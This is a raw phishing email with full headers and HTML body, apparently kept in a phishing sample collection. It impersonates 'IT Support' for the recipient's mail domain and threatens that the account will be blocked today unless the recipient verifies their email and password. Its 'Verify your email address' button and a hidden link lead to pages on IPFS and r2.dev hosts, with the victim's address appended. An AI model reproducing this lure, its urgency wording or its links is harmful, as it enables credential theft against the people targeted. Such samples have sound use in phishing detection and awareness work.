@@ -1,0 +1,231 @@
+From jose@monkey.org Thu May 25 03:28:22 2023 +0000
+Return-Path: info@mabblecroppinginfo.bond
+Delivered-To: jose@monkey.org
+X-FDA: 80827344444.15.7C9D8B2
+Received: from mail.mabblecroppinginfo.bond (mail.mabblecroppinginfo.bond [31.222.235.109])
+	by imf19.b.hostedemail.com (Postfix) with ESMTP id B063240007
+	for <jose@monkey.org>; Thu, 25 May 2023 03:28:20 +0000 (UTC)
+Authentication-Results: imf19.b.hostedemail.com;
+	dkim=pass header.d=mabblecroppinginfo.bond header.s=s20230522893 header.b="zH3/y1+P";
+	spf=pass (imf19.b.hostedemail.com: domain of info@mabblecroppinginfo.bond designates 31.222.235.109 as permitted sender) smtp.mailfrom=info@mabblecroppinginfo.bond;
+	dmarc=pass (policy=none) header.from=mabblecroppinginfo.bond
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1684985301;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=VGcn+wAmOJktBjIniW4rxN+fOoosEZp+gIOL22XO/DU=;
+	b=4MYAlf3EcZroBnyuPLp1vLou+uIDCswv3gFIRIObjRK6yTVBqje4TtJBe8Nu+YykElsZC+
+	nGrBj4U08y3eEVxm7juTJy0doyDsAyXjb/7CFB46UBHTTeHDTCEmaXSSf7M71bjsh1dRj4
+	rQWQWEZh8YtGPQ031l63NiTuwAfSz/s=
+ARC-Authentication-Results: i=1;
+	imf19.b.hostedemail.com;
+	dkim=pass header.d=mabblecroppinginfo.bond header.s=s20230522893 header.b="zH3/y1+P";
+	spf=pass (imf19.b.hostedemail.com: domain of info@mabblecroppinginfo.bond designates 31.222.235.109 as permitted sender) smtp.mailfrom=info@mabblecroppinginfo.bond;
+	dmarc=pass (policy=none) header.from=mabblecroppinginfo.bond
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1684985301; a=rsa-sha256;
+	cv=none;
+	b=o1WOHsfdjI5eKNim27fZ3/4fH3xCDDYdiR2Tnh8jdyd4eNjnRhJEwA6oxmaNMsdFXuM7vE
+	aoM5bzas0cusYJUGasZlwnbJtAopuEGZzrFZ2Kv48Gg1hJZSz2J/kuBnJk0OmCL0wtYE/+
+	nPCEI1xp5sXZi4JZEYBfZLtG8vKhbyE=
+From: IT Support <info@mabblecroppinginfo.bond>
+To: jose@monkey.org
+Subject: Important Notice For jose
+Date: 25 May 2023 06:28:14 +0300
+Message-ID: <20230525062813.E77853450F157A91@mabblecroppinginfo.bond>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Received: from localhost (Unknown [127.0.0.1])
+	by mail.mabblecroppinginfo.bond (Haraka/3.0.1) with ESMTPSA id 3C984E9A-F0C2-48B6-91CA-3444BD833BA6.1
+	envelope-from <info@mabblecroppinginfo.bond>
+	tls TLS_AES_256_GCM_SHA384 (authenticated bits=0);
+	Thu, 25 May 2023 03:28:17 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+	d=mabblecroppinginfo.bond; s=s20230522893;
+	h=from:subject:date:message-id:to:mime-version;
+	bh=ClKGUiOOnwA9D1C5Qdhb2GO4DPdHma0tE6nDQVcS4zQ=;
+	b=zH3/y1+PQfvdBP0zxn3KM3dJjFJjQgInIKe3R841G+6mvYnyo/QiIFvXZdUwyXoOG2OqMmhFJ/
+	B/JrZPaTXDBgcOcgG0/ppg//sdNBKB5TMZKO2EI5D9VOVy+VFAOfPJISAv7WVjtedSpejbKwVbzV
+	Bruattr6RVQAi2jW1NkR8r9Hge4NIZGBNUQq3kc/Dsu9VIY7JD9/oBQavStimIF1GCJFfjmQGrhy
+	ZBP+5EWkWZ+RiVvpKXWDXgMxJPJyO8NUpVWxnV+2efiw04gws/FpdnW7E7zwdySEz86kG70nZH3x
+	7dc7mVxiMJMxg2Foy/lNtDc3wNMuE7qEGphct42Q==
+X-Rspamd-Queue-Id: B063240007
+X-Stat-Signature: grnia4btp486winsh7kankgcu9g5z3yh
+X-Rspam-User: 
+X-Spam-Status: No, score=0.30
+X-Rspamd-Server: rspam05
+X-HE-Tag: 1684985300-593004
+X-HE-Meta: U2FsdGVkX1/xH2Ku0APkvgFQ8wsUTlpCJ2bVtNTgiuA437N+Njw2kpPnIuy5WQO10W1AmNQR3xtFrwRsA9yf9/0c2JxCpqwMxJjEVuM0d7ovw1/dgH1rojoyBM3yDCiKA7L4cuP6KXvvnxWBCzD2rZ2XpGEPO+VPZChp0E79pVJ68vyY3bA0OvWyFyDJYfSEinsPt9L3FfwkzALBYGnfzg+8pvrN72OyVMNKUS6hHfM=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 128
+
+<!DOCTYPE html>
+
+<html><head>
+    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+    <meta charset=3D"utf-8">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0">
+    <title></title>
+</head>
+
+<body style=3D"color: rgb(255, 0, 0); background-color: rgb(255, 255, 255);=
+">
+    <div class=3D"v1v1js-helper v1v1js-readmsg-msg"><u>&nbsp;</u>
+        <div class=3D"v1v1cl_133802"><u>&nbsp;</u>
+            <table style=3D"border: 1px solid rgb(223, 223, 223); border-im=
+age: none; width: 697px; color: rgb(102, 102, 102); line-height: normal; fo=
+nt-family: arial; font-size: 15px; font-stretch: normal; font-variant-numer=
+ic: normal; font-variant-east-asian: normal;" cellspacing=3D"0" cellpadding=
+=3D"0">
+                <tbody>
+                    <tr>
+                        <td style=3D"padding: 8px 20px; border: 1px dotted =
+rgb(211, 211, 211); border-image: none; color: rgb(204, 204, 204); font-fam=
+ily: times; font-size: 20px; background-color: rgb(45, 45, 45);"><span styl=
+e=3D"color: rgb(255, 255, 255);"><strong>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;=
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;monkey.org Notifica=
+tion - ID#220132819</strong></span></td>
+                    </tr>
+                    <tr>
+                        <td valign=3D"top" style=3D"padding: 20px 20px 0px;=
+ border: 1px dotted rgb(211, 211, 211); border-image: none;"><br></td>
+                    </tr>
+                    <tr>
+                        <td style=3D"padding: 0px 20px 20px; border: 1px do=
+tted rgb(211, 211, 211); border-image: none;">
+                            <div style=3D"margin: 0px; padding: 20px; borde=
+r: 1px solid rgb(242, 242, 242); border-image: none; font-family: inherit; =
+vertical-align: baseline;"><span style=3D"color: rgb(0, 0, 255);"><span sty=
+le=3D"font-size: medium;"><span style=3D"border-width: 0px; margin: 0px; pa=
+dding: 0px; font-family: inherit; vertical-align: baseline;"><span style=3D=
+"font-size: 10pt;"><strong><span style=3D"font-size: 10pt;"><span style=3D"=
+font-size: 10pt;">
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp=
+; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nb=
+sp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; <span style=3D"font-size: 14pt;"><fon=
+t color=3D"#0047ab"><span style=3D"font-size: 17pt;"><span style=3D"font-si=
+ze: 19pt;">jose@monkey.org</span></span></font></span></span></span></stron=
+g></span></span></span></span></div><span style=3D"color: rgb(0, 0, 255);">=
+<span style=3D"font-size: medium;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; font-family: i=
+nherit; vertical-align: baseline;">
+                                        <p style=3D"margin: 0px; padding: 2=
+0px; border: 1px solid rgb(242, 242, 242); border-image: none; color: rgb(3=
+4, 34, 34); text-transform: none; text-indent: 0px; letter-spacing: normal;=
+ font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: n=
+ormal; word-spacing: 0px; vertical-align: baseline; white-space: normal; or=
+phans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-lig=
+atures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;"><span style=3D"fo=
+nt-size: 10pt;"><span style=3D"font-size: 10pt;"><span style=3D"font-size: =
+10pt;"><span style=3D"font-size: 11pt;">Your Email address&nbsp;</span></sp=
+an><span style=3D"font-size: 10pt;"><span style=3D"font-size: 10pt;"><span =
+style=3D"font-size: 10pt;"><span style=3D"font-size: 11pt;">
+will be blocked/removed today!!! You need to verify your primary E-mail/Pas=
+sword&nbsp;to continue using your account.</span></span></span></span><br><=
+br><span style=3D"font-size: 10pt;"><span style=3D"font-size: 10pt;"><span =
+style=3D"font-size: 11pt;">We encourage you to take time now to maintain yo=
+ur account activities to avoid login interruption or&nbsp;</span><span styl=
+e=3D"font-size: 10pt;"><span style=3D"font-size: 10pt;"><span style=3D"font=
+-size: 11pt;">losing your account permanently.</span></span>
+</span></span></span></span></span><span style=3D"font-size: 10pt;"><span s=
+tyle=3D"color: rgb(0, 0, 0); font-family: inherit; font-size: medium;"><spa=
+n style=3D"color: rgb(0, 0, 255);">&nbsp;<span style=3D"font-size: 10pt;"><=
+br><strong>&nbsp;</strong></span></span></span></span></p>
+                                    </span></span></span>
+                            <div align=3D"center" style=3D"margin: 0px; pad=
+ding: 20px; border: 1px solid rgb(242, 242, 242); border-image: none; font-=
+family: inherit; vertical-align: baseline;"><span style=3D"color: rgb(0, 0,=
+ 255);"><span style=3D"font-size: medium;"><span style=3D"border-width: 0px=
+; margin: 0px; padding: 0px; font-family: inherit; vertical-align: baseline=
+;"><strong>
+&nbsp;<a style=3D"text-decoration: none;" href=3D"https://bafybeic3gobocslj=
+jp2gyvbm3lzklodnukl7is5dqohowg3fvjtxovtv6m.ipfs.w3s.link/wanRDRneededfiles6=
+867.html#jose@monkey.org">&nbsp;</a><a style=3D"text-decoration: none;" hre=
+f=3D"https://pub-535d7aceb2cc484d95ead7d976aa6005.r2.dev/siru.html#jose@mon=
+key.org">
+<span style=3D"padding: 5px 7px; border-radius: 8px; border: 1px solid rgb(=
+8, 44, 64); border-image: none; text-align: center; color: rgb(255, 255, 25=
+5); line-height: 2em; letter-spacing: 2px; font-size: 24px; font-weight: bo=
+ld; position: relative; cursor: pointer; text-shadow: 1px 1px 1px rgba(5,29=
+,41,1); background-color: rgb(15, 82, 186); -webkit-touch-callout: none; -w=
+ebkit-user-select: all; -khtml-user-select: all; -moz-user-select: all; use=
+r-select: all;">Verify your email address</span></a>
+</strong></span></span></span></div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style=3D"padding: 10px 20px; border: 1px dotted=
+ rgb(211, 211, 211); border-image: none; background-color: rgb(242, 242, 24=
+2);">
+                            <div class=3D"v1form"><span style=3D"font-famil=
+y: Calibri;"><span style=3D"font-size: 11pt;"><font color=3D"#c40000"><stro=
+ng><span style=3D"font-size: 10pt;"><span style=3D"font-size: 13pt;"><span =
+style=3D"font-size: 12pt;">Note:&nbsp;</span></span></span></strong><span s=
+tyle=3D"font-size: 10pt;"><span style=3D"font-size: 13pt;"><span style=3D"f=
+ont-size: 12pt;">We will not be held responsible for any account loss.&nbsp=
+;Please do not reply to this email.</span></span></span><strong>
+<span style=3D"font-size: 10pt;">&nbsp;</span></strong></font></span></span=
+></div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style=3D"padding: 10px 20px; border: 1px dotted=
+ rgb(211, 211, 211); border-image: none; font-size: 11px;"><font color=3D"#=
+000000"><span style=3D"font-size: 9pt;">&nbsp;</span><br><span style=3D"fon=
+t-size: 9pt;">&nbsp;</span><span style=3D'font-family: "Open Sans", sans-se=
+rif; font-size: 10px;'><span class=3D"v1v1gmail_default" style=3D'font-fami=
+ly: "trebuchet ms", sans-serif;'><span style=3D"font-size: 9pt;">&copy;</sp=
+an><strong><span style=3D"font-size: 9pt;">2023</span></strong>
+<span style=3D"font-size: 9pt;"> </span><strong><span style=3D"font-size: 9=
+pt;">&nbsp;monkey.org</span></strong></span></span><span style=3D"font-size=
+: 9pt;"> </span><span style=3D'font-family: "Open Sans", sans-serif; font-s=
+ize: 10px;'><span style=3D"font-size: 9pt;">&nbsp;Account and Services. All=
+ rights reserved Web App Support.</span><span style=3D"color: rgb(0, 0, 255=
+);"><span style=3D"color: rgb(0, 0, 0);"></span></span></span></font><span =
+style=3D"color: rgb(0, 0, 255);">
+<span style=3D"color: rgb(0, 0, 0);"></span></span><span style=3D"color: rg=
+b(0, 0, 0);"></span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <p><br></p>
+    <div class=3D"v1v1js-helper v1v1js-readmsg-msg">
+        <div class=3D"v1v1cl_133802">&nbsp;</div>
+    </div>
+    <p><br></p>
+    <div class=3D"v1v1js-helper v1v1js-readmsg-msg">
+        <div class=3D"v1v1cl_133802">
+            <p>&nbsp;</p>
+        </div>
+    </div>
+    <p><br></p>
+    <table width=3D"100%" style=3D"margin: 0px; padding: 0px; color: rgb(34=
+, 34, 34); text-transform: none; letter-spacing: normal; font-family: Arial=
+, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight:=
+ 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; ta=
+ble-layout: auto !important; border-spacing: 0px; orphans: 2; widows: 2; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;" bgcolor=3D=
+"#f4f4f4" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+        <tbody>
+            <tr>
+                <td align=3D"left" valign=3D"top" style=3D"margin: 0px; pad=
+ding: 0px; width: 924px; font-family: Roboto, RobotoDraft, Helvetica, Arial=
+, sans-serif;">&nbsp;</td>
+            </tr>
+        </tbody>
+    </table>
+
+
+</body></html>
